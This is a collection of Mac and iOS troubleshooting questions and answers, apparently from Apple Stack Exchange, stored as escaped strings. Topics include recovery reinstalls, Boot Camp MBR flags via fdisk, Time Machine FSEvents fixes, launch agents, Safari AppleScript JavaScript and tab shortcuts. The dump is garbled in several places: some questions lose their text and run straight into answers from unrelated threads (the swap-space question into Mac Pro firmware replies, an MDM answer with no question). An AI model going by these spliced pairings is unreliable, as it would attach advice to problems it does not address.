recommend troubleshooting down that path unless you are certain that is the cause.)\n", "Q: Get Messages Beta app to run on OS X Lion I wanted to use iMessage/Messages on my 2008 MacBook. I am stuck on Lion. I saw the Messages beta, and installed it. However, it appears Apple disabled it after Mountain Lion was released.\nI really want to be able to get this to work.\nIs there any way to get this to work? I can try messing with the package contents if I need to, I've dabbled (futilely) with it trying to change the plist contents to accept lower OS X versions. So I'm up for that. I would need instructions, though.\n\nA: Your best bet is to get the mountain lion installed even if the 2008 MacBook officially would not support it. There are number of procedures and tools available, start perhaps on MacRumors that has the most up to date instructions.\nHere an image of a 2007 MacBook running macOS 10.8\n\n", "Q: How to restore Macbook Air to factory settings? I am not a pro-Mac user (I am a Windows user) \nHere's what I did with my old Macbook Air,\n\n\n*\n\n*Press COMMAND + R while booting and it went into the mode shown in the picture\n\n*Selected Macintosh HD to (hopefully) install Mac OS X again\n\n*Entered Apple ID credentials\n\n\nHowever, upon logging in, a message box shows saying that the Apple ID has not been used with App Store then the install won't proceed. \nWhat can be done to format the Macbook Air into factory settings.\n\nA: Your answer is right there in your last line, \"format the MacBook Air...\" Or more correctly format the hard drive.\nWhen you boot into Recovery Mode you should be given the option to launch Disk Utility. Do that, go into Disk Utility, select the Macintosh HD volume/partition and format it.\nOnce there is nothing on the internal drive it should allow you to install macOS and there should be no conflict with the credentials previously used.\nIf you have not established an AppleID and logged into the App Store before you may need to do this once. It will likely want a payment method (credit card) but downloading and installing macOS is free. You should be able to do this in iTunes on your MacBook Air before you do the whole reformat then reinstall routine.\n\nA: The best solution that worked for me:\n\n\n*\n\n*Download a Mac OS X image, a DMG file (High Sierra in my case)\n\n*Access a working Windows PC, download and install Transmac Software https://www.acutesystems.com/scrtm.htm\n\n*Plug a suitable USB drive (16 GB in my case) and format for Mac using the Transmac software.\n\n*Restore the downloaded OS X image into the USB using the guide provided on the software website (the link on Step 2) \n\n*Plug the USB into the MacBook Air and boot from USB and waiter for 1 to 2 hours for the installation to finish, then log in my Apple ID (the same account I have tried on my OP) \n\n\nThen everything worked fine. MacBook Air is fresh as new. \n", "Q: Problems setting up startmail client on ipad I've tried twice from scratch to set up an IMAP account for Startmail on my ipad and the steps appear to be simple however when I try to use it I'm told that either my userid or password is incorrect on my imap connection.  I've verifed these and they are correct.  I'm familiar with setting up an IMAP client to Startmail because I've done it on other hardware.  Any suggestions would be welcome.\n\nA: I had previously logged into the Startmail web client on the iPad and iOS stored the password automatically without my being aware of it.  One of the security features of Startmail is that it assigns a new password to any device that accesses it using IMAP.  When I set up the IMAP account on the iPad I entered the new, device specific password but iOS over-rode it with the stored, web-client value.  Since it was typing in a password field I couldn't see it.  When I found the stored password and deleted it I was able to set up the IMAP account following Startmail's instructions.\n", "Q: How to free up a swap space manually without restart?

I'm pretty sure that my slowness of the system (like load avg and including often mouse freeze) is caused by this constant creation and removal of these files, as I don't have any other processes which is using my CPU much.\nFor example, before writing this post, I had 13G of swap files (1G each), during my writing and pasting above output I ended up with 15G (by doing almost nothing), then macOS actually removed swapfile14 and swapfile15 (so 13G of swap) when writing this. Then removed swapfile13 when writing this sentence. Then created up to swapfile16 (16G) when writing this sentence. And removed swapfile16 again when writing this sentence. And so on. What a mess.

Is it possible to upgrade Mac Pro 2.1 to 5.1 firmware? Does it also make sense -- is the hardware different? Has it been done before?\n\nA: No, it is not possible, so it doesn't make sense and hasn't been done before. \nYes, the hardware is different (considerably). It's a completely different board and layout where the CPU and RAM are. The difference on the cases is around the FireWire 400 ports.\nThe 1,1 could be flashed to 2,1, and the 4,1 to 5,1; that mainly buys you newer CPU support (well, newer compared to the original firmware's capabilities).\nThe 1,1 and 2,1 have 32-bit EFI firmware; many have searched for ways to change that without much success (see MacRumors' forums).  One answer I read suggested swapping out the motherboard.\nAll three (1,1-3,1) use older DDR2 frame-buffered DIMM's, whereas the 4,1/5,1 use DDR3 DIMMs.  The supported CPU's are also different.\n\nA: Dont let him put you off. \nYou can at least use Pikers boot efi to convert it to 64 bit and run any MacOS up to El Capitan.

Sign up for a free MDM solution and enroll your child's iOS device under management. \n\n\n*\n\n*add the app(s) in question to management\n\n\nYou then get telemetry and reporting if that app is installed. \nI prefer JAMF now, but there are several options. I’d start with this and then research others once this one has some specific drawbacks for you. \n\n\n*\n\n*https://support.jamfnow.com/\nYou won’t need DEP or VPP to run family devices under management. \n", "Q: Boot Camp files available from finder but unavailable from Startup Manager I know that many other people have already posted similar problems, but I have tried all their fixes and still none of them have worked.\nEarlier, I had a \"No Bootable Device\" error, and I followed the instructions provided in order to fix that. That then created a \"No Operating System\" error, which I also tried to fix with the known method. That didn't work either. Is there anything else I can do?\nSystem Information:\n\n\n*\n\n*Bootcamp is using a BIOS Method\n\n*2012 MacBook Pro\n\n*High Sierra 10.13.4\n\n\n\n\n\nA: An \"Missing operating system\" error is issued when the code stored in the MBR executes, reads the first 512 bytes of the boot volume and determines the read bytes do not end in 0xAA55. The assumption here is the code stored in the MBR came from a Windows installation. If the source for code came from another product (such as rEFInd), the message could be sightly different. The signature of 0xAA55 is present when a volume contains bootable Microsoft software.\nNormally, when Windows is installed for a BIOS boot, the MBR partition table has the Windows partition flagged as the boot volume. If some other partition is flagged and is not bootable, the \"Missing operating system\" message is issued and the computer halts. This will occur even if Windows appears in \"Startup Disk\" pane in the System Preferences application.\nThe sudo fdisk /dev/disk0 command prints the contents of the MBR partition table. The partition flagged as bootable is marked with an * character. Below is the output from this command, when issue on my 2011 iMac. (The Boot Camp Assistant was not used to install Windows on this Mac.)\n\nNote: With High Sierra (and many other older macOS versions), System Integrity Protection (SIP) must be disabled before entering the sudo fdisk /dev/disk0 command.\n\nDisk: /dev/disk0    geometry: 60801/255/63 [976773168 sectors]\nSignature: 0xAA55\n         Starting       Ending\n #: id  cyl  hd sec -  cyl  hd sec [     start -       size]\n------------------------------------------------------------------------\n 1: EE 1023 254  63 - 1023 254  63 [         1 -     409639] <Unknown ID>\n*2: 07 1023 254  63 - 1023 254  63 [    409640 -  195312500] HPFS/QNX/AUX\n 3: 07 1023 254  63 - 1023 254  63 [ 195722140 -   95441064] HPFS/QNX/AUX\n 4: AF 1023 254  63 - 1023 254  63 [ 291163208 -  294176536] HFS+        \n\nIn my case, Windows 10 is installed in the second partition. In your case, the third partition should be marked.\n\nNote: I assume the 2rd, 3rd and 4th partitions in your GUID Partition Table (GPT) correspond to the 2rd, 3rd and 4th partitions in your MBR partition table. Normally, for a BIOS boot of Windows on a Mac, this usually is the case.\n\nYou can flag the third partition by entering the interactive command sudo fdisk -e /dev/disk0 with SIP disabled. Below is an example of the output from executing this command.\nfdisk: could not open MBR file /usr/standalone/i386/boot0: No such file or directory\nEnter 'help' for information\nfdisk: 1> f 3\nPartition 3 marked active.\nfdisk:*1> q\nWriting current MBR to disk.\nDevice could not be accessed exclusively.\nA reboot will be needed for changes to take effect. OK? [n] y\n\nThe interactive input, shown above, is given below.\nf 3\nq\ny\n\nIf the event your third partition is correctly flagged, there is an place later in the BIOS boot sequence where the message \"An operating system wasn't found\" can appear. If this occurs, then post a comment.\nAppendix\nWhat is shown in this appendix can be skipped by the OP. I just wanted to document the resources used to answer this question.\nThe code shown below was create with the help from the website Online Assembler and Disassembler and verified using the Microsoft Macro Assembler 8.0 (MASM).

You are so close on the fourth try:\nwget -qO- 'https://www.com/big.pdf' | open -f -a Preview.app\n\nLuckily the -a argument lets the -f take the data from stdin but not open in TextEdit.\n\nA: You can open a PDF as a Bash variable (expressed as a path to the file) like this.\n\n\n*\n\n*Set your variable:\npdf=/path/to/44592-linux-restricted-shell-bypass-guide.pdf\n\n\n*Open the file like this:\nopen \"$pdf\" -a Preview\n\nHowever, your example indicates that the file doesn't exist on your filesystem. If you want to open a raw data stream stored in a variable, I recommend echoing your variable, and piping it to open using the -f option like this.\n\n\n*\n\n*Define your variable:\npdf=$(wget -qO- https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)\n\n\n*Open the raw data as a stream from standard input:\necho $pdf | open -f -a Preview\n\nExplanation:\nIf you store the output of wget -qO- … as a variable, as opposed to downloading the file onto your filesystem, open won't know what to do as you're passing it the raw file data rather than the path to the file. In man open ‘file’ refers to an openable file for the given application, the variable in your example is not that. The -f option is useful in this scenario as your method of setting the variable involves storing the entire file stream, which won't be interpreted as a file by open, and therefore it can only be opened as a file stream.\n\nA: The same thing @bmike suggested but without wget which isn't native to OS X\ncurl -so- 'https://www.example.com/some.pdf' | open -f -a Preview.app\n\n", "Q: Is there a way to have Siri make a web call?

Unfortunately Google Assistant doesn’t run in the background or I would just use that.  Can Siri open a favorite link in Safari?\n\nA: This can now be done with the Shortcuts app. All you need to do is create a shortcut that runs the “Open URLs” action. Inside this action, you need to put the URL you want to open when run.

You can ensure that there are no duplicate images between directories.\n\n*Go to each Space one-by-one and choose custom directory for background image.\n\n*Set the background image for each Space from the respective directory.\nUsing this approach you can ensure there’s no duplication.\n", "Q: JavaScript run by AppleScript to click button and fill text in Safari I’m not managing to execute JavaScript in Safari anymore.\nI have this working script for Chrome.\nset caseID to \"11111\"\nend tell\n\n\n####################################### time #########\nset myDate to date string of (current date)\n\n\nset myTime to time string of (current date)\n\nset myDateTime to myDate & \" - \" & myTime\n\n\nset textToSave to \"MY TEXT HERE\nHERE\nHERE\n\" & myDateTime\n\ntell application \"Google Chrome\"\n    delay 0.1\n    execute front window's active tab javascript \"document.getElementsByName('9.9.5.4.5.CSInfoInspector.1.1.1')[0].click();\"\n    delay 0.1\n    execute front window's active tab javascript \"document.getElementsByName('05.5.54.5.CSInfoInspector.1.1.5.41.3.7.57.1')[0].value=\" & quoted form of textToSave \n    delay 0.1\n    execute front window's active tab javascript \"document.getElementsByName('5.5.4.5.5.CSInspector.5.1.7')[0].value=\" & quoted form of caseID\n\nend tell\n\nI converted to Safari here:\nset caseID to \"11111\"\n\n####################################### time #########\nset myDate to date string of (current date)\n\n\nset myTime to time string of (current date)\n\nset myDateTime to myDate & \" - \" & myTime\n\n\nset textToSave to \"MY TEXT HERE\nHERE\nHERE\n\" & myDateTime\n\ntell application \"Safari\"\n    delay 0.1\n    do JavaScript \"document.getElementsByName('9.9.5.4.5.CSInfoInspector.1.1.1')[0].click();\" in current tab of window 1\n    delay 0.1\n\n    do JavaScript \"document.getElementsByName('05.5.54.5.CSInfoInspector.1.1.5.41.3.7.57.1')[0].value=\" & quoted form of textToSave in current tab of window 1\n\n    do JavaScript \"document.getElementsByName('5.5.4.5.5.CSInspector.5.1.7')[0].value=\" & quoted form of caseID in current tab of window 1\n\nend tell\n\nThe result do return on AppleScript but Safari actually take no action\nResult:\n\"11111\"\nBasically the script is suppose to click on a button to have a pop windows and fill up the text\nWhat am I doing wrong?\nMy system:\nOS X 10.13.2 (17C202)\nSafari Version 11.0.2 (13604.4.7.1.5)\n\nA: So unlike Chrome where you can just adding few line with different JS code,\nin safari you have to added for each code do JavaScript and mention the document / tab\ne.g :\ntell application \"Safari\"\n    delay 0.1\n    do JavaScript \"document.getElementById('accountEnabledSelection').value=1\" in current tab of window 1\n    do JavaScript \"document.getElementsByName('demo')[0].click();\" in current tab of window 1\n\n\nend tell\n\n", "Q: Applescript javascript multiple line How can we add multiple line text in Chrome using document.getElementsByClassName?\nI have no issue when it's one line but one I have more than one I have a missing value instead \n  set myCaseNote to \"MULTIPLE\n    LINE\n    TEXT\n    HERE\"\n\n    tell application \"Google Chrome\"\n        tell tab 3 of window 1 to set RemoveBtRestriction to execute javascript ¬\n            \" document.getElementsByClassName('text-entry')[1].value=\" & quoted form of myCaseNote & \"\"\n    end tell\n\n\nResult: missing value\n\n\nA: set myCaseNote to \"MULTIPLE\\\\nLINE\\\\nTEXT\\\\nHERE\"\n\nSplitting the string over several physical lines as you did causes a syntax error in the JavaScript.

If you are entering it directly into the developer console inside the web browser, the single escape \\n is fine. ]\nSo, Option 1, is to adjust this formatting setting in Script Editor.

I open the App Store and press Update All. I realize it's going to take too long or I am on the wrong data connection. I just want to stop the update all command.

That stops the download, but leaves all queued apps for the update in an unavailable state.\nIs there a way to stop all or is it just racing and press stop on each queued app for update?\n\nA: Currently, there is no one button way to cancel or stop all the updates started by pressing the \"Update All\" button, maybe in a future release of iOS we can have a Cancel All or Pause all. Submit your feeback to Apple, here.\nThe current solution is to manually stop updating each app that was started updating:\n\n\n*\n\n*First turn off your data if you are concerned with burning through metered data. Switch your iOS device into Airplane mode via Control Center\n\n*Open the App Store app, switch to the \"Updates\" tab.\n\n*Then tap on the download progress circle for each app that is waiting to update.\n\nA: *\n\n*Turn phone to Airplane Mode\n\n*Restart the iPhone (Press and quickly release the volume up button. Press and quickly release the volume down button. Press and hold the side button. When the Apple logo appears, release the button).\n\n*Turn Airplane mode off\n\n\nA: There is no way to cancel all updates at once. To avoid data usage all you can do is turn off Wifi and mobile data and then cancel the apps one by one.\nEDIT: Just had an idea that maybe closing the AppStore app would stop and cancel all updates, but the updates keep running even when the AppStore app is terminated.\n\nA: There is no mechanism to cancel all the running app updates in one go. However, if you are concerned about data, you can individually cancel the app updates. The following instructions apply to iPhone 6s/6s Plus and later (with 3D touch available).\n\n\n*\n\n*Force touch the app icon for which an update is in progress.\n\n*In the Quick Action menu, you'll find the options to Cancel and Pause download.\n\n\n\n*Select the desired option.\n\n\nImage Source\n", "Q: Mac Pro 2013 eGPU My friend has a Late 2013 Mac Pro and he would like to connect an eGPU.

I recently cloned my late-2015 MacBook Pro (to another of the same model) using Acronis True Image 2018 for Mac. The cloning part worked well, but on the new laptop my Time Machine incremental backups are taking 30+ minutes to complete even though there's been almost no activity on my Mac since the last backup and very little (under 1GB) is usually backed up each time.\nBoth original and new laptop are running High Sierra using the new (APFS) file system. \nWhen I look at Time Machine activity during a backup using sudo fs_usage -f filesys backupd it looks like TM is requesting data on 100,000's of different files, even though they haven't changed since the last backup and aren't actually backed up.  It's as if TM isn't correctly using FSEvents to know which files have changed.  \nThe 30+ minute numbers are after I've already used sudo sysctl debug.lowpri_throttle_enabled=0 to speed up backups. Without this setting, they're even slower.\nI've already tried deleting all old backups and even creating a brand-new share on my NAS device. Nothing worked.\nAny ideas how to get quicker incremental backups?\n\nA: I found this answer on Apple's forums (excerpted below) after much searching. After applying the solution below, incremental backups only take a few minutes after the first (very long) backup. Looks like my suspicions were correct about FSEvents not working. I suspect that something about the disk cloning process-- both for me and for the poster excerpted below-- messed up FSEvents logs and a rebuild was needed of those logs. \nSharing the solution here to help others: \n\nI was having the same problem (hours-long backups of a few MB) after\n  using CCC to transfer my files to a brand new SSD. I don't think the\n  SSD has any problems, as it is brand new, and the disk verification\n  checks out. After hours of searching online, disabling Spotlight, and\n  using TimeTracker to see if 100000+ files were actually changed (they\n  were not), I found the following seems to work:\n  \n  \n*\n  \n*Delete /.fseventsd on your startup drive or move it to another location:\n  \n  \n  sudo mv /.fseventsd /.fseventsd.bak\n\n  \n*Reboot\n  \n*Start a Time Machine backup\nAfterwards, the first time TM is run, it took much less time to reach\n  \"Finishing Backup,\" though it stayed on that step a really long time.\n  However, subsequent TM runs are back to normal.\nSource: http://www.ehmac.ca/archive/index.php/t-100787.html\n(Posting here so more people can find the solution; it took me several\n  hours to find that one.)\n\n", "Q: Why does the MacOS App Store ask for other users Apple ID password? We have an iMac with two users A and B who \n\n\n*\n\n*are both logged in\n\n*are both administrators\n\n*have different Apple IDs (and are both logged in to their's)\n\n\nToday A wanted to update an app using the Updates function in the app Store and was asked for B's password. As usual, the Apple ID was not to change, it just asked for the password.  It was definitely A who first installed this app because B never uses it.  In fact, it is not even on the list of \"purchases\" of B (it's a free app, though).\nWhat to do about it?\nCurious Addendum: A got B to log in and update the app, which worked fine without even asking for B's password or asking to close the app which was running in A's logged in account. Usually, when A updated the app in the past, it would refuse to run an update while the app was running.\n\nA: Software you buy through the App Store is registered to an Apple ID, not a computer. This gets confusing when multiple people use their Apple ID to install software on the same computer. \nThe installers for some applications, often ones that have processes running the the background all the time, are often smart enough to quit and restart as part of the install/update process. \nHope this helps!\nRic\n", "Q: How to prevent app from auto starting I know there are Login Items under Users & Groups and /Library/LaunchAgents and /Library/LaunchDaemons under Library, System/Library and Users/FooUser/Library. And then there's right click on Dock icon -> Options -> Open at Login.\nWhat other methods are there for apps to auto-start? The reason why I'm asking is because the Spotify App (downloaded from http://www.spotify.com) keeps starting up whenever I restart my Mac, even though I made sure there is no corresponding entry in any of the above mentioned places.\n\nA: There are two places for LaunchAgents to be called from:\n\n\n*\n\n*/Library/LaunchAgents - this launches a process at login for every user\n\n*~/Library/LaunchAgents - this launches a process at login for a specific user.\n\n\nThe Spotify startup plist is found in the latter; the com.spotify.webhelper.plist allows you to open Spotify via the web.\nIssue the command launchctl list | grep -i spotify and you should find (up to) two plists that are loaded:\n$ launchctl list | grep spotify\n-       0   com.spotify.client.startuphelper\n9087    0   com.spotify.webhelper\n\nTo unload them, you can uncheck the option in Advanced Settings\n (Command,)\n\nOr...\nYou can issue the command:\n$ launchctl unload com.spotify.client.startuphelper.plist\n\n\nA: There are several ways that programs can automatically start in macOS:\nFirst check \"Login Items\" which are found in System Preferences after clicking the \"Users & Groups\" icons. I understand that you have already checked here and did not find Spotify.\nAnother possibility is that Spotify have been set to open at login from the dock. You can right-click the Spotify icon in the dock, and then in the Options menu make sure that \"Open at login\" is not enabled.\nSimilarly if you have left Spotify running when you power down the Mac then by default the app and open windows will be opened again after rebooting. You can avoid this by ensuring that you close Spotify before logging out or rebooting, or change the setting in general by clicking the \"General\" icon System Preferences and making sure there's a checkmark in \"Close windows when quitting an app\".\nA third possibility is that it is possible to create configuration files for launchd that will automatically start programs at boot or login. You'll find these configurations files in:\n~/Library/LaunchAgents/\n/Library/LaunchAgents/\n/Library/LaunchDaemons/\n\nNote that the ~ characters means your user's home folder.\nA final possiblity is that applications in macOS can come with a \"shared helper application\". Essentially this application would provide some background service to one or more actual applications from that developer. Some use that helper application to later launch their actual application.\nThe helper application is located within the application's bundle in the Contents/Library/LoginItems folder. For Spotify that is usually in the following location:\n/Applications/Spotify.app/Contents/Library/LoginItems/StartUpHelper.app\n\nYou can prevent that from autostarting Spotify by closing the helper app, or making sure that it cannot start (for example by removing the executable bit on the actual executable: /Applications/Spotify.app/Contents/Library/LoginItems/StartUpHelper.app/Contents/MacOS/StartUpHelper)\n", "Q: Why does my MacBook Air (almost) always lock when I shut the lid? In system preferences, under Security and Privacy, the \"Require Password\" box is not checked. Interestingly, even when I have entered my password and the lock icon is open, I cannot check this box - I click on it, and the checkmark briefly appears and then goes away. \nDespite the box not being checked, my computer almost always makes me type in a password when I open it or after it goes into the screen saver.\nOccasionally, it does unlock automatically, but when it does so, I cannot click or interact with any windows, and I have to shut and open my screen again and type the password in order to actually use my computer.\nI am using a MacBook Air running macOS High Sierra.\n\nA: If you close your laptop then immediately reopen it does it lock itself? also in the settings it specifies that it will not lock after \"sleep or screen saver begins.\" Which means what may be happening is that your MacBook is passed a sleep state and has entered standby mode and locked itself. \nSide Note: Why would you want your mac not to lock itself. Closing the lid does not protect against potential attackers if you have this setting disabled. It also makes it harder to lock you computer when you want to. \n", "Q: Changing iOS app icon I want to change the app icon for a pre-installed iOS app. What are my options?\nIs there a way I can download an .ipsw file, change the icon of the app in it, then change something to make iTunes think it is newer than the version currently on the device, so it can apply it as an update, so all my data on the device will not be removed? (Which would happen if I applied it by restoring with it.)\n\nA: No.\nIt is not possible for a user to change app icon for any iOS app, let alone system apps.\niOS doesn't allow users to tinker with .ipsw files and have them installed. Making any change to the app bundle would alter its signature and there would be no way for the system to verify if the app came from the original developer.\nThis idea is one of the major foundation for iOS security.\n", "Q: AppleScript icon (ICNS) not changing i create a little app using Script Editor and exported to .app file. now im trying to change the icon to a custom .icns file. the icns file was converted from a png using this website. also tried using this website.\nafter copying the icns to Contents/Resources/applet.icns and modifying the below lines of the Info.plist:\n<key>CFBundleIconFile</key>\n<string>applet</string>\n\nalso tried Contents/Resources/customFilename.icns and Contents/Resources/customFilename:\n<key>CFBundleIconFile</key>\n<string>customFilename</string>\n\nthe .app icon doesnt change. im sure the files are in .icns format. how can i debug and figure out why the .app isnt taking the .icns's?\nApp made in Applescript Icon wont change\n\nA: No image conversion was necessary.  In Finder.app, just (control + click) on the file that you want to change its icon, and choose the \"Get  info\" command.  Next, just drag your icon file from Finder, directly onto the actual icon image in the get info window you previously opened... Then you're good to go\n\n", "Q: Adding binary to ~/.local/bin In short, I have a working executable in my home directory. I want to make the executable available in the Terminal for the current user in any directory.\nMore context: The executable is geckodriver. The book I am using, Test-Driven Development with Python by Harry J.W. Percival, says \"For macOS or Linux users, one convenient place to put [Geckodriver] is ~/.local/bin\"\nBased on this suggestion, I thought I should do something like mv geckodriver ~/.local/bin. Turns out ~/.local/bin is an executable, not a directory on my machine. This is keeping me from simply creating a bin directory in ~/.local.\nI think there is something fundamental I do not understand here. Any clues?\n\nA: What you did was move the geckodriver executable into ~/.local, and rename it to bin. The directory must exist first before mv can move anything into it, or it will assume you intend to rename the file at the destination. You can either delete ~/.local/bin with rm ~/.local/bin and make the directory with mkdir ~/.local/bin, then redownload it, or you can run the command mv ~/.local/bin ~/.local/geckodriver && mkdir ~/.local/bin && mv ~/.local/geckodriver ~/.local/bin, so you don't have to redownload it.\n", "Q: macOS High Sierra - Time Machine no longer recognizing iMac backups on USB drive My iMac backups that are stored on an external USB drive are suddenly not being recognized for backing up. Using option key and pull-down menu, I can select the set of backups on this USB drive and can restore from them, but I cannot get Time Machine to use that folder for more incremental backups — It wants to create a brand new backup (for which there is not room).\nI have deleted the file /Library/Preferences/com.apple.TimeMachine.plist and rebooted the iMac, but the problem persists. I think the cause may be related to my very brief use of this USB backup file with Migration Assistant to put files onto an external hard drive: that drive now seems to be linked to this backup file in the Backups.backupdp folder.\nHow do I change that? I have discussed this at length with Apple support but was given no really useful advice.\n\nA: The answer turned out to be very simple. In the command for tmutil I had copied the format and so I typed \"[-a]\" when I should have typed \"-a\". The error message always gave me the impression that the addresses were not correct. The proper error message should have said I should not include \"[\" or \"]\"\n", "Q: Shortcut For Adding Bullet Point In Mac's Notes Application Does anyone know if there is a way I can start a bullet point list in the updated Notes app that comes with the MacOS with a keyboard shortcut that looks\n\n\n*\n\n*like this\n\n\n\n\n\n*\n\n*or this\n\n\nI use the app in class a lot because I like the snappy UI and, would like to add them quicker to improve my workflow.\nI know that in Microsoft Word the shortcuts would be..\na.

On 'keyboard viewer' I see that clicking and holding the cmd should temporarly switch to the other language (instead of cmd+space and then cmd+space again to go back), but that doesn't seem to work. any idea why? \n\nA: Cmd isn’t mormally used for making characters in macos -- instead it is employed for menu shortcuts and other purposes. You can use caps lock to switch to the US keyboard for character input if you set that option in system preferences/keyboard/input sources.  \nIf you use the input source named \"Hebrew\" , then you should be able to get Latin characters by pressing caps lock (without actually switching to the US layout).\nThe input source named \"Hebrew PC\" will generate Latin characters when you hold down the Shift key, but only upper case.\n", "Q: Why is ad still briefly playing after a restart? I’m playing this game on an iPhone and, every 3 rounds there’s an Ad playing that you can usualy skip after 5 seconds. \nHowever, it takes shorter to just kill de app when the Ad appears and launch it again than to wait those 5 seconds. + I don’t have to see the ad this way. \nHowever, after the app relaunches, the ad still plays for a second before the app launches normally. It’s like that part was cached or something. \nHow can iOS allow that? It’s clearly not something the app developer intended, or that the devs could even control. \nI should mention though, the ad only plays if I quickly relaunch the app. If I wait a bit before relaunching the app, I no longer see the ad. \n\nA: iOS has a feature to make \"unpausing\" apps seem faster when they are not in memory anymore. Your device keeps a screenshot of your app and if it has to be purged from memory (put on pause) it will show the screenshot until the app is ready. \nThis usually works very well but can look unexpected when you force quit the app which leads to it not taking off at the same point but showing the initial screen again. \n", "Q: Will installing XtraFinder make my system vulnerable?

(You'll need to press and hold Shift key, to enter { and } key).\nThis shortcut works with almost all the apps that I personally use, which support multiple tabs under a single window. A few examples include: Apple's own apps such as:\n\n\n*\n\n*Safari\n\n*Maps\n\n*Preview\n\n*Terminal\n\n*Xcode\nas well as 3rd party apps such as: \n\n\n*\n\n*Sublime Text\n\n*Google Chrome\n\n*Firefox\n\n*Opera\n\nA: Use Command + Shift + ← to go to the left tab and Command + Shift + → to go the to right tab.\nThis works in both Finder and Safari. It could be other combinations for other programs.\n\nA: In general, there is no Universal way to do this, unless you're content to do all your work in Safari and Finder (as @iTunes said).\nEven terminal has a different scheme for switching (Command + `).\nIn Firefox and Chrome, it's Command + Option + ← and Command + Option + →.\n\nA: Control + Tab works in a lot of applications, including Safari, Firefox, Finder, and Terminal. It's also cross-platform - works on Windows as well to switch between program tabs. Holding down Shift reverses order (right-to-left instead of left-to-right).\n\nA: How to use Control + → (or any other shortcut) for switching tabs:\n\n*\n\n*Go to System Preferences → Keyboard → Shortcuts.\n\n\n*Click on Google Chrome, then on plus sign.\n\n\n\n*In Menu Title type \"Select next tab\" and in Keyboard Shortcut record Control + → combination.\n\n\nDo the same for Select previous tab menu title.\n", "Q: iOS - App Store view app purchase history I didn’t pay attention in which iOS version it happened but as you know, Apple redesigned their App Store.\nHowever there’s something I can’t find anymore with this version of App Store: The whole list of purchased apps associated with the iCloud account signed in.\nIn the previous App Store you could go to App Store app → Updates and, on top of the list, there was an item named Purchased, that, when clicked, would show a list of purchased apps in a descending chronological order. \nWhere can we find that list now that Apple redesigned the App Store?\n\nA: Apple introduced the first major App Store re-design with iOS 11.\nIn the re-designed App Store app, you can easily find the list of app purchases linked to the Apple ID currently logged into iTunes & App Store, by tapping on the Account profile picture visible towards top right on all of Today, Games, Apps and Updates tabs.\nTo view the list of purchased apps:\n\n\n*\n\n*Open App Store App. Tap on the Account profile picture shown towards top right, from any one of the tabs.\n\n*A new screen animates from the bottom.

I believe this is the 2015 model, and it does not have a touchbar.\nI have been using the laptop itself for a while, and I'm ready to get a dual monitor setup for productivity purposes. I specifically wanted a monitor that would be very similar to the retina quality of the laptop's screen, so I went for the most pixel dense option I could find under $500, and this meant going for a 24 inch 4k. I picked the Dell P2415Q.\nFirst and foremost, will I have any issues running this monitor at 60hz? Second, how could I go about using two of these at 60hz? If I like this one, I'm going to order a second one.\nThanks in advance for your help. I just switched to Mac after years of using Windows/Linux on a 5k gaming PC I built four years ago, so I'm not used to having to consider these sorts of questions.\n\nA: You should be able to run two 4K monitors at 60hz. However, you'll probably be stuck at 30hz if you are using HDMi. If it is in fact a 2015 MBP, there should be a few thunderbolt 2 ports. I'd suggest using a mini display port -> display port cable that supports Display Port 1.2 and thunderbolt 2. Something like this should do the job. Also, since I don't know the exact model you have, I'd hold off on buying the second monitor until you know what your MBP is fully capable of. \n", "Q: iOS - Photos & message access to MDM installed apps In iOS, is it possible for apps managed via MDM to get access to photos and text/WhatsApp text messages of user stored on user's iPhone. If yes, what kind of permissions do these actions require?\n\nA: MDM controls how an iOS device is remotely configured and what apps are pushed to be installed. It has nothing to do with what permissions are available to an app.\nReading photos stored on devices requires access to user photos. The mechanism to ask user for photos permission can be programmed by an iOS app developer and would work in the same way irrespective of the way the app is installed (MDM or App Store).\nThere are no permissions/mechanisms available in iOS which can let a third party app read text and WhatsApp messages. Each app is technically sandboxed and need to seek permission from iOS to access user data and device hardware.\n", "Q: My iPhone messages changes colors at times between green and blue or other way around. How do I stop this I have an iPhone 6.  When I text another iPhone user. My messages and my friends will show up in a blue text bubble. If my friend is not using an iPhone, the messages will show in a green text bubble (i think). Sometimes the message bubbles will be one color but after a few minutes, change to the other color.  What causes this and is there a way to stop it? \n\nA: If your iPhone cannot send the message as an iMessage (blue) it will fallback to SMS/MMS (green). This can happen for a bunch of reasons, which I've listed below. \n\n\n*\n\n*Network is unavailable: iMessage uses internet access however SMS is able to work over raw cell network. This is very helpful if you're on the edge of a service area or are roaming. To fix this issue make sure you have proper network access.  \n\n*iMessage services could not be reached: if you have functional internet access iMessage may still fall back to SMS if for whatever reason the iMessage service is blocked on the network or there is a problem on Apple's end\n\n*The user is no longer available on iMessage: If a user used to be registered with iMessage (and you successfully sent messages to them this way in the past) your iPhone will automatically try first to send through iMessage without first checking if that number/address still has iMessage activated on it. The number may suddenly disappear from iMessage if for example the user gets an Android phone. This should really only happen once. \n\n\nThis is nothing to worry about, nothing weird is going on. \nNote that this is all about falling back from iMessage to SMS. I have never seen it go from SMS to iMessage (green to blue) however. I do not believe iOS ever decides to try sending as iMessage if SMS fails. iOS will however check sometimes when you send SMS if the recipient suddenly is registered with iMessage so that can be used in the future. \n\nA: Short of disabling SMS you can’t directly influence this. iMessage has priority so the device tries several times to deliver messages over iMessage, so the messages go green only as a last resort to deliver them when a data connection isn’t available. \nAlso, if the other party has the network issues, you might not be controlling the fallback - it could be the other person in the message thread. \nI suppose you could turn off iMessage entirely and just let everything go over SMS as well. \n", "Q: How to boot into internet recovery mode with rEFInd installed? I have the bootup manager rEFInd installed on my Macbook. The key combinations for recovery (Command R and Command R+I) just boot into rEFnd's bootloader.

While being sold bottom quality LCD replacements for my iPhone 5 and subsequently returning them six times I lost one of the screws that holds the LCD shield plate in place. It's the one closest to the home button on the back of the LCD assembly. \n\nSince I continue to have issues with the digitizer / touch screen, I wanted to check whether that screw is somehow integral to the touch capabilities of the screen. \nSome issues I'm having:\n\n\n*\n\n*No input is registered if I put the phone on a surface and only touch the screen, i.e. without grounding myself by touching the metal case or frame. Plugged in earphones or charge cable works as a substitute to allow input. \n\n*A slightly damp finger makes every scrollview jump around like crazy and makes phantom taps on other parts of the screen.\n\n*Trying to scroll with one finger often results in zooming instead, i.e. pinch gestures.\n\n\nThe LCDs were delivered without any sponges on the plugs of the wires, unlike the official screen assembly. Not sure if that's relevant at all. \n\nA: The missing screw from the heat shield in your image shouldn't affect your iPhone 5 in the way you're experiencing. Its only purpose is to keep the heat shield in place, which in turn protects the LCD from excess heat. \nIn your case, since the heat shield is still there, the digitiser/LCD shouldn't be affected by 